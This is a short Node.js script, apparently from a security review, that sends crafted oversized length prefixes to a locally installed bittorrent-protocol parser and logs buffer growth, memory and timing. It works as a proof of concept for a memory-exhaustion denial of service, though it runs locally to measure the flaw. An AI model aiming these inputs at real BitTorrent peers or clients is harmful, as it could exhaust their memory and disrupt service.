// Local, harmless measurement: feed a crafted length prefix to the installed bittorrent-protocol parser.
// Uses internal methods only to skip the handshake; measures buffering + CPU. Not a network attack.
import Wire from '$HOME/Documents/Projects/magnet-web/node_modules/bittorrent-protocol/index.js'

function mk () {
  const w = new Wire()
  w._parse(4, w._onMessageLength)   // pretend handshake already done
  w.on('error', e => console.log('wire error:', e.message))
  return w
}
const feed = (w, chunk) => new Promise(r => w._write(chunk, r))
const u32 = n => new Uint8Array([(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255])

// Test A: 0xFFFFFFFF prefix
{
  const w = mk()
  await feed(w, u32(0xFFFFFFFF))
  console.log('A) prefix 0xFFFFFFFF -> _parserSize =', w._parserSize, '(negative/zero-ish => treated as keep-alive; then re-parsing 4 bytes)')
}
// Test B: 0x7FFFFFFF prefix, then stream 16 KiB chunks and time it
{
  const w = mk()
  await feed(w, u32(0x7FFFFFFF))
  console.log('B) prefix 0x7FFFFFFF -> _parserSize =', w._parserSize, '(i.e. waits for 2 GiB-1 bytes)')
  const chunk = new Uint8Array(16 * 1024).fill(0x41)
  const t0 = performance.now()
  let last = t0
  const total = 12000 // 12000 * 16KiB = 187.5 MiB
  for (let i = 1; i <= total; i++) {
    await feed(w, chunk)
    if (i % 2000 === 0) {
      const now = performance.now()
      const mu = process.memoryUsage()
      console.log(`   after ${(i*16/1024).toFixed(0)} MiB: bufferSize=${(w._bufferSize/1048576).toFixed(0)} MiB, last 2000 chunks took ${(now-last).toFixed(0)} ms, rss=${(mu.rss/1048576).toFixed(0)} MiB, arrayBuffers=${(mu.arrayBuffers/1048576).toFixed(0)} MiB`)
      last = now
    }
  }
  console.log('   total ms for', total, 'chunks:', (performance.now() - t0).toFixed(0), '| message ever delivered to app?', w._parserSize > w._bufferSize ? 'no (still waiting)' : 'yes')
}
